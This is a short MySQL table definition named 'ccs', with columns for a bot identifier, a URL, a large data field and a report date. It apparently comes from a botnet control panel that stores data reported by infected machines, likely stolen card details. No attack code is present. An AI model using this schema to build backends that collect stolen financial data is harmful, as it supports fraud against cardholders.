CREATE TABLE IF NOT EXISTS `ccs` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `bot_guid` varchar(40) NOT NULL,
  `url` varchar(200) NOT NULL,
  `data` varchar(30000) NOT NULL,
  `date_rep` datetime NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1016 ;
